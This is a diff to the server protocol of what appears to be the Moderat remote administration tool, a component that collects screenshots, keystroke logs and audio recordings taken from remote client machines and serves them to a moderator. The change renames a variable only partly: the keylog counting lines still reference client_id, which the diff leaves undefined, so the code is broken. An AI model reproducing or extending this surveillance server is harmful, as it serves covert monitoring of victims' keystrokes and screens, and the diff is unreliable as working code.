@@ -157,11 +157,11 @@ class ModeratServerProtocol(LineReceiver):
             elif self.mode == 'countData':
                 screen_data = self.payload.split()
                 if len(screen_data) == 2:
-                    client_id, date = screen_data
+                    identifier, date = screen_data
                     counted_data = {
                         'screenshots': {
-                            'new': self.factory.database.get_screenshots_count_0(client_id, date),
-                            'old': self.factory.database.get_screenshots_count_1(client_id, date)
+                            'new': self.factory.database.get_screenshots_count_0(identifier, date),
+                            'old': self.factory.database.get_screenshots_count_1(identifier, date)
                         },
                         'keylogs': {
                             'new': self.factory.database.get_keylogs_count_0(client_id, date),
@@ -178,7 +178,7 @@ class ModeratServerProtocol(LineReceiver):
                     self.factory.log.warning('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
 
             elif self.mode == 'downloadLogs':
-                if type(payload) == dict:
+                if type(self.payload) == dict:
                     download_info = self.payload
                     # Get All Logs
                     if download_info['screenshot']:
@@ -200,14 +200,6 @@ class ModeratServerProtocol(LineReceiver):
                                                                                        download_info['date'])
                     else:
                         audios = []
-
-                    # Send Counted Logs
-                    counted_logs = {
-                        'screenshots': len(screenshots),
-                        'keylogs': len(keylogs),
-                        'audios': len(audios),
-                    }
-                    self.sendMessage(self, counted_logs)
 
                     # Start Send Screenshots
                     for screenshot in screenshots:
